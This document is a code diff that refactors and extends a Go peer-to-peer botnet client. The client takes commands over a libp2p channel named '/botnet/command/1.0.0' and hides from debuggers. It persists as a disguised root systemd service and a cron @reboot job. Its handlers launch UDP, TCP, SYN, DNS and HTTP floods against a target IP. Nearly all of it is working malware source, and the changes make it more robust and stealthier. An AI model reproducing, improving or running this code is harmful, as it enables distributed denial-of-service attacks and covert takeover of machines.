@@ -10,6 +10,7 @@ import (
 	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -21,15 +22,15 @@ import (
 	"sync/atomic"
 	"time"
 
-	"github.com/fatih/color"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/libp2p/go-libp2p"
-	"github.com/libp2p/go-libp2p-core/crypto"
-	"github.com/libp2p/go-libp2p-core/host"
-	"github.com/libp2p/go-libp2p-core/network"
-	"github.com/libp2p/go-libp2p-core/peer"
 	dht "github.com/libp2p/go-libp2p-kad-dht"
+	"github.com/libp2p/go-libp2p/core/crypto"
+	"github.com/libp2p/go-libp2p/core/host"
+	"github.com/libp2p/go-libp2p/core/network"
+	"github.com/libp2p/go-libp2p/core/peer"
+	"github.com/libp2p/go-libp2p/core/protocol"
 	"github.com/miekg/dns"
 )
 
@@ -42,17 +43,18 @@ const (
 	statusUpdateInterval = 5 * time.Minute
 	commandFetchInterval = 10 * time.Second
 	numWorkers           = 2024
+	maxPacketSize        = 65507
 )
 
 var (
 	bootstrapPeers = []string{
 		"/ip4/104.131.131.82/tcp/4001/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
-		"/ip4/104.131.131.82/udp/4001/quic/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
+		"/ip4/104.131.131.82/udp/4001/quic-v1/p2p/QmaCpDMGvV2BGHeYERUEnRQAwe3N8SzbUtfsmvsqQLuvuJ",
 	}
-	publicKey       *rsa.PublicKey
-	startTime       = time.Now()
-	attackCounter   int64
-	replayCache     = struct {
+	publicKey     *rsa.PublicKey
+	startTime     = time.Now()
+	attackCounter int64
+	replayCache   = struct {
 		sync.RWMutex
 		entries map[string]time.Time
 	}{entries: make(map[string]time.Time)}
@@ -82,73 +84,89 @@ func NewP2PNode() (*P2PNode, error) {
 	priv, err := loadOrGenerateKey()
 	if err != nil {
 		cancel()
-		return nil, err
+		return nil, fmt.Errorf("failed to load/generate key: %w", err)
 	}
 
-	h, err := libp2p.New(libp2p.Identity(priv), libp2p.NATPortMap())
+	h, err := libp2p.New(
+		libp2p.Identity(priv),
+		libp2p.NATPortMap(),
+		libp2p.EnableRelay(),
+		libp2p.EnableAutoRelay(),
+	)
 	if err != nil {
 		cancel()
-		return nil, err
+		return nil, fmt.Errorf("failed to create host: %w", err)
 	}
 
-	kadDHT, err := dht.New(ctx, h)
+	kadDHT, err := dht.New(ctx, h, dht.Mode(dht.ModeAutoServer))
 	if err != nil {
 		cancel()
-		return nil, err
+		return nil, fmt.Errorf("failed to create DHT: %w", err)
 	}
 
 	if err = kadDHT.Bootstrap(ctx); err != nil {
 		cancel()
-		return nil, err
+		return nil, fmt.Errorf("failed to bootstrap DHT: %w", err)
 	}
 
-	return &P2PNode{Host: h, DHT: kadDHT, Ctx: ctx, Cancel: cancel}, nil
+	return &P2PNode{
+		Host:   h,
+		DHT:    kadDHT,
+		Ctx:    ctx,
+		Cancel: cancel,
+	}, nil
 }
 
 func loadOrGenerateKey() (crypto.PrivKey, error) {
 	if _, err := os.Stat(peerKeyFile); err == nil {
 		keyBytes, err := os.ReadFile(peerKeyFile)
 		if err != nil {
-			return nil, err
+			return nil, fmt.Errorf("failed to read key file: %w", err)
 		}
 		return crypto.UnmarshalPrivateKey(keyBytes)
 	}
 
-	priv, _, err := crypto.GenerateKeyPairWithReader(crypto.RSA, 2048, rand.Reader)
+	priv, _, err := crypto.GenerateKeyPair(crypto.RSA, 2048)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to generate key pair: %w", err)
 	}
 
 	keyBytes, err := crypto.MarshalPrivateKey(priv)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to marshal private key: %w", err)
 	}
 
 	if err := os.MkdirAll(persistenceDir, 0700); err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to create persistence dir: %w", err)
 	}
 
 	if err := os.WriteFile(peerKeyFile, keyBytes, 0600); err != nil {
-		return nil, err
+		return nil, fmt.Errorf("failed to write key file: %w", err)
 	}
 
 	return priv, nil
 }
 
 func (n *P2PNode) ConnectToBootstrapPeers() {
+	var wg sync.WaitGroup
 	for _, peerAddr := range bootstrapPeers {
-		addr, err := peer.AddrInfoFromString(peerAddr)
-		if err != nil {
-			continue
-		}
-		if err := n.Host.Connect(n.Ctx, *addr); err != nil {
-			continue
-		}
+		wg.Add(1)
+		go func(addr string) {
+			defer wg.Done()
+			peerInfo, err := peer.AddrInfoFromString(addr)
+			if err != nil {
+				return
+			}
+			if err := n.Host.Connect(n.Ctx, *peerInfo); err != nil {
+				return
+			}
+		}(peerAddr)
 	}
+	wg.Wait()
 }
 
 func (n *P2PNode) StartCommandListener() {
-	n.Host.SetStreamHandler("/botnet/command/1.0.0", func(s network.Stream) {
+	n.Host.SetStreamHandler(protocol.ID("/botnet/command/1.0.0"), func(s network.Stream) {
 		defer s.Close()
 		var cmd Command
 		if err := json.NewDecoder(s).Decode(&cmd); err != nil {
@@ -222,6 +240,8 @@ func (b *BotNode) ReportStatus() {
 			"uptime":       time.Since(startTime).Seconds(),
 			"last_command": b.LastCommandTime,
 			"attack_count": atomic.LoadInt64(&attackCounter),
+			"connections":  len(b.Host.Network().Conns()),
+			"dht_peers":    b.DHT.RoutingTable().Size(),
 		}
 		data, _ := json.Marshal(status)
 		_ = b.DHT.PutValue(b.Ctx, "bot_stats_"+b.Host.ID().String(), data)
@@ -264,16 +284,16 @@ func CheckDebuggers() {
 func SetupPersistence() error {
 	exePath, err := os.Executable()
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to get executable path: %w", err)
 	}
 
 	if err := os.MkdirAll(persistenceDir, 0755); err != nil {
-		return err
+		return fmt.Errorf("failed to create persistence dir: %w", err)
 	}
 
 	targetPath := filepath.Join(persistenceDir, ".systemd-process")
 	if err := copyFile(exePath, targetPath); err != nil {
-		return err
+		return fmt.Errorf("failed to copy executable: %w", err)
 	}
 
 	serviceContent := fmt.Sprintf(`[Unit]
@@ -285,20 +305,29 @@ Restart=always
 RestartSec=60
 StandardOutput=null
 StandardError=null
+User=root
 [Install]
 WantedBy=multi-user.target`, targetPath)
 
 	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
-		return err
+		return fmt.Errorf("failed to write service file: %w", err)
+	}
+
+	if err := exec.Command("systemctl", "daemon-reload").Run(); err != nil {
+		return fmt.Errorf("failed to reload systemd: %w", err)
 	}
 
 	if err := exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run(); err != nil {
-		return err
+		return fmt.Errorf("failed to enable service: %w", err)
 	}
 
 	cronJob := fmt.Sprintf("@reboot %s", targetPath)
 	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
-	return cmd.Run()
+	if err := cmd.Run(); err != nil {
+		return fmt.Errorf("failed to set up cron job: %w", err)
+	}
+
+	return nil
 }
 
 func copyFile(src, dst string) error {
@@ -325,7 +354,7 @@ func handleCommand(cmd string) {
 		if len(fields) != 4 {
 			return
 		}
-		go TCPfloodAttack(fields[1], fields[2], fields[3])
+		go performTCPFlood(fields[1], fields[2], fields[3])
 	case "!synflood":
 		if len(fields) != 4 {
 			return
@@ -352,80 +381,96 @@ func performUDPFlood(targetIP, portStr, durationStr string) {
 	duration, _ := strconv.Atoi(durationStr)
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var wg sync.WaitGroup
+
 	var packetCount int64
 	dstIP := net.ParseIP(targetIP)
-	payload := make([]byte, 65507)
+	if dstIP == nil {
+		return
+	}
+
+	payload := make([]byte, maxPacketSize)
 	rand.Read(payload)
+
+	var wg sync.WaitGroup
+	worker := func() {
+		defer wg.Done()
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				sourcePort := rand.Intn(65535-1024) + 1024
+				conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
+				if err != nil {
+					continue
+				}
+				_, err = conn.Write(payload)
+				if err == nil {
+					atomic.AddInt64(&packetCount, 1)
+				}
+				conn.Close()
+			}
+		}
+	}
+
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					sourcePort := rand.Intn(65535-1024) + 1024
-					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sourcePort}, &net.UDPAddr{IP: dstIP, Port: port})
-					if err != nil {
-						continue
-					}
-					_, err = conn.Write(payload)
-					if err == nil {
-						atomic.AddInt64(&packetCount, 1)
-					}
-					conn.Close()
-				}
-			}
-		}()
+		go worker()
 	}
 	wg.Wait()
 }
 
-func TCPfloodAttack(targetIP, portStr, durationStr string) {
+func performTCPFlood(targetIP, portStr, durationStr string) {
 	port, _ := strconv.Atoi(portStr)
 	duration, _ := strconv.Atoi(durationStr)
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var wg sync.WaitGroup
+
 	var packetCount int64
 	dstIP := net.ParseIP(targetIP)
+	if dstIP == nil {
+		return
+	}
+
+	var wg sync.WaitGroup
+	worker := func() {
+		defer wg.Done()
+		conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
+		if err != nil {
+			return
+		}
+		defer conn.Close()
+
+		payload := make([]byte, maxPacketSize-40)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				tcpLayer := &layers.TCP{
+					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
+					DstPort:    layers.TCPPort(port),
+					Seq:        rand.Uint32(),
+					Window:     12800,
+					SYN:        true,
+					DataOffset: 5,
+				}
+				rand.Read(payload)
+				buffer := gopacket.NewSerializeBuffer()
+				if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
+					continue
+				}
+				if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
+					continue
+				}
+				atomic.AddInt64(&packetCount, 1)
+			}
+		}
+	}
+
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					tcpLayer := &layers.TCP{
-						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
-						DstPort:    layers.TCPPort(port),
-						Seq:        rand.Uint32(),
-						Window:     12800,
-						SYN:        true,
-						DataOffset: 5,
-					}
-					payload := make([]byte, 65535-40)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						continue
-					}
-					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
+		go worker()
 	}
 	wg.Wait()
 }
@@ -435,44 +480,52 @@ func performSYNFlood(targetIP, portStr, durationStr string) {
 	duration, _ := strconv.Atoi(durationStr)
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var wg sync.WaitGroup
+
 	var packetCount int64
 	dstIP := net.ParseIP(targetIP)
+	if dstIP == nil {
+		return
+	}
+
+	var wg sync.WaitGroup
+	worker := func() {
+		defer wg.Done()
+		conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
+		if err != nil {
+			return
+		}
+		defer conn.Close()
+
+		payload := make([]byte, maxPacketSize-40)
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				tcpLayer := &layers.TCP{
+					SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
+					DstPort:    layers.TCPPort(port),
+					Seq:        rand.Uint32(),
+					Window:     12800,
+					SYN:        true,
+					DataOffset: 5,
+				}
+				rand.Read(payload)
+				buffer := gopacket.NewSerializeBuffer()
+				if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
+					continue
+				}
+				if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
+					continue
+				}
+				atomic.AddInt64(&packetCount, 1)
+			}
+		}
+	}
+
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					tcpLayer := &layers.TCP{
-						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024),
-						DstPort:    layers.TCPPort(port),
-						Seq:        rand.Uint32(),
-						Window:     12800,
-						SYN:        true,
-						DataOffset: 5,
-					}
-					payload := make([]byte, 65535-40)
-					rand.Read(payload)
-					buffer := gopacket.NewSerializeBuffer()
-					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload)); err != nil {
-						continue
-					}
-					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
+		go worker()
 	}
 	wg.Wait()
 }
@@ -482,41 +535,50 @@ func performDNSFlood(targetIP, portStr, durationStr string) {
 	duration, _ := strconv.Atoi(durationStr)
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var wg sync.WaitGroup
+
 	var packetCount int64
 	dstIP := net.ParseIP(targetIP)
-	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
+	if dstIP == nil {
+		return
+	}
+
+	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
 	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
+
+	var wg sync.WaitGroup
+	worker := func() {
+		defer wg.Done()
+		conn, err := net.ListenPacket("udp", ":0")
+		if err != nil {
+			return
+		}
+		defer conn.Close()
+
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				domain := domains[rand.Intn(len(domains))]
+				queryType := queryTypes[rand.Intn(len(queryTypes))]
+				dnsQuery := constructDNSQuery(domain, queryType)
+				buffer, err := dnsQuery.Pack()
+				if err != nil {
+					continue
+				}
+				sourcePort := rand.Intn(65535-1024) + 1024
+				_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
+				if err != nil {
+					continue
+				}
+				atomic.AddInt64(&packetCount, 1)
+			}
+		}
+	}
+
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			conn, err := net.ListenPacket("udp", ":0")
-			if err != nil {
-				return
-			}
-			defer conn.Close()
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					domain := domains[rand.Intn(len(domains))]
-					queryType := queryTypes[rand.Intn(len(queryTypes))]
-					dnsQuery := constructDNSQuery(domain, queryType)
-					buffer, err := dnsQuery.Pack()
-					if err != nil {
-						continue
-					}
-					sourcePort := rand.Intn(65535-1024) + 1024
-					_, err = conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: port, Zone: fmt.Sprintf("%d", sourcePort)})
-					if err != nil {
-						continue
-					}
-					atomic.AddInt64(&packetCount, 1)
-				}
-			}
-		}()
+		go worker()
 	}
 	wg.Wait()
 }
@@ -526,49 +588,60 @@ func performHTTPFlood(targetIP, portStr, durationStr string) {
 	duration, _ := strconv.Atoi(durationStr)
 	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
 	defer cancel()
-	var wg sync.WaitGroup
+
 	var requestCount int64
 	resolvedIP, err := resolveTarget(targetIP)
 	if err != nil {
 		return
 	}
 	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, port)
+
 	userAgents := []string{
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
-		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Safari/537.36",
+		"Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
 	}
+
 	referers := []string{
 		"https://www.google.com/",
 		"https://www.example.com/",
 		"https://www.wikipedia.org/",
 	}
+
+	var wg sync.WaitGroup
+	worker := func() {
+		defer wg.Done()
+		client := &http.Client{
+			Timeout: 5 * time.Second,
+		}
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				body := make([]byte, 1024)
+				rand.Read(body)
+				req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
+				if err != nil {
+					continue
+				}
+				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+				req.Header.Set("Referer", referers[rand.Intn(len(referers))])
+				req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
+				req.Header.Set("Accept-Language", "en-US,en;q=0.5")
+				resp, err := client.Do(req)
+				if err != nil {
+					continue
+				}
+				resp.Body.Close()
+				atomic.AddInt64(&requestCount, 1)
+			}
+		}
+	}
+
 	for i := 0; i < numWorkers; i++ {
 		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			client := &http.Client{}
-			for {
-				select {
-				case <-ctx.Done():
-					return
-				default:
-					body := make([]byte, 1024)
-					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
-					if err != nil {
-						continue
-					}
-					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
-					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
-					resp, err := client.Do(req)
-					if err != nil {
-						continue
-					}
-					resp.Body.Close()
-					atomic.AddInt64(&requestCount, 1)
-				}
-			}
-		}()
+		go worker()
 	}
 	wg.Wait()
 }
@@ -580,17 +653,17 @@ func resolveTarget(target string) (string, error) {
 	url := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", target)
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to create DNS request: %w", err)
 	}
 	req.Header.Set("Accept", "application/dns-json")
-	client := &http.Client{}
+	client := &http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Do(req)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to perform DNS lookup: %w", err)
 	}
 	defer resp.Body.Close()
 	if resp.StatusCode != http.StatusOK {
-		return "", fmt.Errorf("status code %d", resp.StatusCode)
+		return "", fmt.Errorf("DNS lookup failed with status: %d", resp.StatusCode)
 	}
 	var dnsResp struct {
 		Answer []struct {
@@ -598,10 +671,10 @@ func resolveTarget(target string) (string, error) {
 		} `json:"Answer"`
 	}
 	if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
-		return "", err
+		return "", fmt.Errorf("failed to decode DNS response: %w", err)
 	}
 	if len(dnsResp.Answer) == 0 {
-		return "", fmt.Errorf("no records found")
+		return "", fmt.Errorf("no DNS records found")
 	}
 	return dnsResp.Answer[0].Data, nil
 }
@@ -609,6 +682,7 @@ func resolveTarget(target string) (string, error) {
 func constructDNSQuery(domain string, queryType uint16) *dns.Msg {
 	msg := new(dns.Msg)
 	msg.SetQuestion(dns.Fqdn(domain), queryType)
+	msg.RecursionDesired = true
 	edns0 := new(dns.OPT)
 	edns0.Hdr.Name = "."
 	edns0.Hdr.Rrtype = dns.TypeOPT
@@ -626,17 +700,23 @@ func killerMaps() {
 func main() {
 	node, err := NewP2PNode()
 	if err != nil {
-		return
+		fmt.Printf("Failed to create P2P node: %v\n", err)
+		os.Exit(1)
 	}
 	defer node.Cancel()
 
 	bot := &BotNode{P2PNode: *node}
 	if err := bot.Start(); err != nil {
-		return
+		fmt.Printf("Failed to start bot: %v\n", err)
+		os.Exit(1)
 	}
 
 	go CheckDebuggers()
-	go SetupPersistence()
+	if err := SetupPersistence(); err != nil {
+		fmt.Printf("Failed to setup persistence: %v\n", err)
+	}
+
+	fmt.Printf("Bot started with ID: %s\n", node.Host.ID())
 
 	select {}
 }
